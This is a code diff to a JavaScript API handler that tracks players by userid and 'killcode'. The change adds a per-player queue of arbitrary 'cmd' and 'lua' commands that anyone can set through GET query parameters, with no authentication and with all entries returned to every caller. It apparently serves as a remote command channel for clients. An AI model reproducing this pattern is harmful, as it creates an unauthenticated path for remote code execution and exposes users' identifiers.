@@ -5,19 +5,23 @@ export default function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
 
   if (req.method === 'GET') {
-    const { player, userid, killcode, timestamp } = req.query;
+    const { player, userid, killcode, timestamp, cmd, lua } = req.query;
 
+    // Register/update player
     if (player && userid && killcode) {
-      const entry = {
-        player,
-        userid,
-        killcode,
-        timestamp: timestamp || Date.now()
-      };
+      let entry = players.find(p => p.killcode === killcode);
+      if (!entry) {
+        entry = { player, userid, killcode, timestamp: timestamp || Date.now(), commands: [] };
+        players.push(entry);
+      } else {
+        entry.player = player;
+        entry.userid = userid;
+        entry.timestamp = timestamp || Date.now();
+      }
 
-      const i = players.findIndex(p => p.killcode === killcode);
-      if (i >= 0) players[i] = entry;
-      else players.push(entry);
+      // If a command was sent, queue it
+      if (cmd) entry.commands.push({ type: "cmd", value: cmd, ts: Date.now() });
+      if (lua) entry.commands.push({ type: "lua", value: lua, ts: Date.now() });
     }
 
     res.status(200).json(players);
